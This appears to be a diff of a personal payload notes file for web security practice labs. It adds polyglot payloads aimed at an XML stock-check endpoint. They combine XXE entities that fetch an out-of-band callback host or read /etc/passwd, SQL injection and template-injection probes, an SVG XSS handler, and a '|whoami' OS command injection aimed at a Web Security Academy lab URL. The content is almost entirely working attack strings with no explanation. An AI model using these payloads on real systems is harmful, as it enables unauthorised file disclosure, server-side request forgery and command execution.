@@ -19,3 +19,10 @@ SSRF
 <?xml version="1.0" encoding="UTF-8" ?><!-- 'or 1=1--><!-- "><%=7*7%>{{7*7}}%{48+1} --><!DOCTYPE test [ <!ENTITY x SYSTEM "https://c9bc2lb4668eb9k38nugxpxh16fx43dda.oast.online">]><stockCheck><productId>&x;</productId><storeId>1</storeId><![CDATA[<s><svg/onload=prompt(5);>]]></stockCheck>
 
 <?xml version="1.0" encoding="UTF-8" ?><!-- 'or 1=1--><!-- "><%=7*7%>{{7*7}}%{48+1} --><!DOCTYPE test [ <!ENTITY x SYSTEM "file:///etc/passwd">]><stockCheck><productId>&x;</productId><storeId>1</storeId><![CDATA[<s><svg/onload=prompt(5);>]]></stockCheck>
+
+OS Command Injection productId=1&storeId=1|whoami&%7C%3C%3Fxml%20version%3D%221.0%22%20encoding%3D%22UTF-8%22%20%
+3F%3E%3C%21--%20%27or%201%3D1--%3E%3C%21--%20%22%3E%3C%25%3D7%2A7%25%3E%7B%7B7%2A7%7D%7D%25%7B48%2B1%7D%20--%3E%3C%21DOC
+TYPE%20test%20%5B%20%3C%21ENTITY%20x%20SYSTEM%20%22file%3A%2F%2F%2Fetc%2Fpasswd%22%3E%5D%3E%3CstockCheck%3E%3CproductId%
+3E%26x%3B%3C%2FproductId%3E%3CstoreId%3E1%3C%2FstoreId%3E%3C%21%5BCDATA%5B%3Cs%3E%3Csvg%2Fonload%3Dprompt%285%29%3B%3E%5
+D%5D%3E%3C%2FstockCheck%3E' [https://ac8d1fe81f7c2b1cc05c3e7900b000b9.web-security-academy.net/product?productId=1]
+
